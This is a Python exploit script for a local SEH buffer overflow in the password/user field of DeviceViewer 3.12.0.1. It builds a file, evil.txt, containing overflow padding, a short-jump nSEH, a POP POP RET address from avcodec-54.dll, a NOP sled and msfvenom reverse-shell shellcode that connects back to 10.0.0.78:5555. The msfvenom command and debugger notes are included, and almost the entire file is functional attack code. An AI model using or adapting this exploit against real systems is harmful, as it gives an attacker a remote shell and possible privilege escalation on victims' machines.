from struct import *

# Date : 9/20/2019
#
# Exploit summary :
#   A local standard SEH overflow exists in both password field when logging in and exiting the application
#   on XP, an attacker can abuse this SEH overflow to obtain code execution and a local shell, which 
#   potentionally can result in privesc if the circustances are right.
#
#   Vendor application : DeviceViewer 3.12.0.1
#       http://download.sricam.com/Manual/DeviceViewer.exe
#   Affected locations : both password field when logging in and out of the application.
#   Tested on: Windows 7 sp1


#----------------------------------------#
# Bad characters: "\x00\x0a\x0d"         #  
# POP POP RET: 0x6A0E6A86                #
# SEH handler offset: 264                #
#----------------------------------------#

malicious_file = "evil.txt"

#  Exception Offset:	41414141

# clean set without any bad characters - removed '\x00\x0a\x0d'   
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.78 LPORT=5555 -f c -b '\x00\x0a\x0d' EXITFUNC=seh
shellcode = (
"\xbf\x4c\xae\x85\x3c\xd9\xc1\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x31\x7d\x12\x03\x7d\x12\x83\xa1\x52\x67\xc9\xc5\x43\xea"
"\x32\x35\x94\x8b\xbb\xd0\xa5\x8b\xd8\x91\x96\x3b\xaa\xf7\x1a"
"\xb7\xfe\xe3\xa9\xb5\xd6\x04\x19\x73\x01\x2b\x9a\x28\x71\x2a"
"\x18\x33\xa6\x8c\x21\xfc\xbb\xcd\x66\xe1\x36\x9f\x3f\x6d\xe4"
"\x0f\x4b\x3b\x35\xa4\x07\xad\x3d\x59\xdf\xcc\x6c\xcc\x6b\x97"
"\xae\xef\xb8\xa3\xe6\xf7\xdd\x8e\xb1\x8c\x16\x64\x40\x44\x67"
"\x85\xef\xa9\x47\x74\xf1\xee\x60\x67\x84\x06\x93\x1a\x9f\xdd"
"\xe9\xc0\x2a\xc5\x4a\x82\x8d\x21\x6a\x47\x4b\xa2\x60\x2c\x1f"
"\xec\x64\xb3\xcc\x87\x91\x38\xf3\x47\x10\x7a\xd0\x43\x78\xd8"
"\x79\xd2\x24\x8f\x86\x04\x87\x70\x23\x4f\x2a\x64\x5e\x12\x23"
"\x49\x53\xac\xb3\xc5\xe4\xdf\x81\x4a\x5f\x77\xaa\x03\x79\x80"
"\xcd\x39\x3d\x1e\x30\xc2\x3e\x37\xf7\x96\x6e\x2f\xde\x96\xe4"
"\xaf\xdf\x42\xaa\xff\x4f\x3d\x0b\xaf\x2f\xed\xe3\xa5\xbf\xd2"
"\x14\xc6\x15\x7b\xbe\x3d\xfe\x8e\x3f\x3d\xb0\xe6\x3d\x3d\x59"
"\x44\xc8\xdb\x0b\xba\x9d\x74\xa4\x23\x84\x0e\x55\xab\x12\x6b"
"\x55\x27\x91\x8c\x18\xc0\xdc\x9e\xcd\x20\xab\xfc\x58\x3e\x01"
"\x68\x06\xad\xce\x68\x41\xce\x58\x3f\x06\x20\x91\xd5\xba\x1b"
"\x0b\xcb\x46\xfd\x74\x4f\x9d\x3e\x7a\x4e\x50\x7a\x58\x40\xac"
"\x83\xe4\x34\x60\xd2\xb2\xe2\xc6\x8c\x74\x5c\x91\x63\xdf\x08"
"\x64\x48\xe0\x4e\x69\x85\x96\xae\xd8\x70\xef\xd1\xd5\x14\xe7"
"\xaa\x0b\x85\x08\x61\x88\xbb\xf9\xbb\x05\x2b\xa0\x2e\x64\x31"
"\x53\x85\xab\x4c\xd0\x2f\x54\xab\xc8\x5a\x51\xf7\x4e\xb7\x2b"
"\x68\x3b\xb7\x98\x89\x6e")

seh = pack('I', 0x6A0E6A86) # POP POP RET from - avcodec-54.dll
nseh = '\xeb\x06\x90\x90' # short jump 6 over island

payload  = "A" * 264 # fill up the buffer space with calculated offset - !mona findmsp
payload += nseh # a short jump \xEB\X06 to jump over 6 placed 
payload += seh # POP POP RET from an associated DLL without any protections - !mona seh -n
payload += "\x90" * 16 # small NOPSLED to catch the short jump
payload += shellcode # pops a reverse shell back to the host system
payload += "C" *(4000 - len(payload))

# Log data, item 13
# Address=6A11548E
# Message=  0x6a11548e : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [avcodec-54.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\DeviceViewer\avcodec-54.dll)

# Log data, item 44
# Address=0BADF00D
# Message=    SEH record (nseh field) at 0x0041f12c overwritten with normal pattern : 0x41386941 (offset 264), followed by 9728 bytes of cyclic data after the handler


try:
    print("[x] DeviceViewer v3.12.0.1 username field SEH local buffer overflow\n")
    print("[x] Opening the malicious file")
    payload_execution = open(malicious_file, "w+")
    print("[x] Creating malicious file called evil.txt")
    payload_execution.write(payload)
    print("[x] Adding payload to the malicious file")
    payload_execution.close()
    print("[x] Copy the contents of evil.txt to the USER field")
except:
    print("[!] Error running the exploit")
